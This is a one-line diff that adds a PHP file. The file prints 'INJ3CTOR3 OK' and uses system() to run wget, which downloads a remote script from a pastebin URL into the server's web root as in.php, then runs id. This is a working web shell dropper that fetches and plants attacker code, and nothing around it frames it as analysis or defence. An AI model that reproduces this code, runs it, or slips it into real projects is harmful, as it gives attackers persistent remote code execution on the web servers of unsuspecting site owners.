@@ -1,0 +1,1 @@
+<?php echo "INJ3CTOR3 OK";system("wget -O /var/www/html/in.php http://pastebin.com/raw/i2dKGFeJ;id"); ?>
